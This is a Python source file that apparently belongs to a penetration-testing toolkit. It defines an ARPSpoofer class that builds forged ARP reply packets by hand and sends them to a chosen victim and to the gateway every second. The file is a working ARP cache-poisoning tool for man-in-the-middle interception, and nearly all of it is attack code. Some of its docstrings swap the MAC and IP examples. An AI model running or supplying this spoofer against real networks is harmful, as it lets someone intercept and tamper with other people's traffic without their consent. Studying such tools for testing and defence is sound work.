#!/usr/bin/env python3
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 3 as
# published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Written by:
#        Nadzeya Hutsko <nadzya.info@gmail.com>


import socket
import textwrap
import time
import logging

from .validators import make_valid_mac_address, validate_ip_address


_LOGGER = logging.getLogger(__name__)


class ARPSpoofer:
    """A class that represents an ARP spoofing attack"""

    def __init__(self, interface, your_mac):
        """
        Initialaze an ARPSpoofer object

        :interface: your network interface that is connected
                    to the tested network (i.e wlan0)
        :your_mac: your MAC-address (b"\xbb\xbb\xbb\xbb\xbb\xbb"
                                     == bb:bb:bb:bb:bb:bb)
        """
        self.interface = interface
        self.mac = make_valid_mac_address(your_mac)
        _LOGGER.debug(
            f"Creating an ARPSpoofer object with your interface {interface}"
            f" and MAC-address {your_mac}"
        )
        self.description = textwrap.dedent(
            """\
            The ARP spoofing attack description\
            """
        )

    def add_gateway(self, gateway_mac, gateway_ip):
        """
        Add info about the gateway

        :gateway_mac: gateway's MAC-address (i.e. "192.168.100.1")
        :gateway_ip: gateway's IP-address from your network
                     (i.e. b"\xaa\xaa\xaa\xaa\xaa\xaa" == aa:aa:aa:aa:aa:aa)
        """
        self.gateway_mac = make_valid_mac_address(gateway_mac)
        self.gateway_ip = socket.inet_aton(validate_ip_address(gateway_ip))
        _LOGGER.debug(
            f"Adding gateway with MAC {gateway_mac} and IP {gateway_ip}"
        )

    def add_victim(self, victim_mac, victim_ip):
        """
        Add info about the victim

        :victim_mac: victim's MAC-address (i.e. "192.168.100.2")
        :victim_ip: victim's IP-address from your network
                    (i.e. b"\xcc\xcc\xcc\xcc\xcc\xcc" == cc:cc:cc:cc:cc:cc)
        """
        self.victim_mac = make_valid_mac_address(victim_mac)
        self.victim_ip = socket.inet_aton(validate_ip_address(victim_ip))
        _LOGGER.debug(
            f"Adding gateway with MAC {victim_mac} and IP {victim_ip}"
        )

    def run(self):
        """Run the ARP spoofing attack until KeyboardInterrupt"""
        _LOGGER.warning(
            "Running the ARP spoofing attack. Press Ctrl+C to stop"
        )
        self._make_prototcol_headers()
        self._make_packet_for_gateway()
        self._make_packet_for_victim()
        try:
            connect = socket.socket(
                socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0800)
            )
            connect.bind((self.interface, socket.htons(0x0800)))
        except Exception as exc:
            _LOGGER.error(exc)
            exit(1)

        request_victim = (
            self.victim_packet
            + self.protocol
            + self.mac
            + self.gateway_ip
            + self.victim_mac
            + self.victim_ip
        )
        request_gateway = (
            self.gateway_packet
            + self.protocol
            + self.mac
            + self.victim_ip
            + self.gateway_mac
            + self.gateway_ip
        )
        while True:
            try:
                connect.send(request_victim)
                connect.send(request_gateway)
                time.sleep(1)
            except KeyboardInterrupt:
                _LOGGER.warning("Stopping ARP spoofing attack")
                break
            except Exception as exc:
                _LOGGER.error(exc)
                break

    def _make_prototcol_headers(self):
        """Create protocol headers without MAC and IP addresses"""
        htype = b"\x00\x01"  # Hardware Type
        ptype = b"\x08\x00"  # Protocol Type
        hlen = b"\x06"  # Hardware Length
        plen = b"\x04"  # Protocol Length
        operation = b"\x00\x02"  # Operation Code - Response
        self.protocol = htype + ptype + hlen + plen + operation  # Body

    def _make_packet_for_gateway(self):
        """Create a packet sample that will be send to the gateway"""
        arp_code = b"\x08\x06"  # Protocol code
        self.gateway_packet = self.gateway_mac + self.mac + arp_code

    def _make_packet_for_victim(self):
        """Create a packet sample that will be send to the victim"""
        arp_code = b"\x08\x06"  # Protocol code
        self.victim_packet = self.victim_mac + self.mac + arp_code
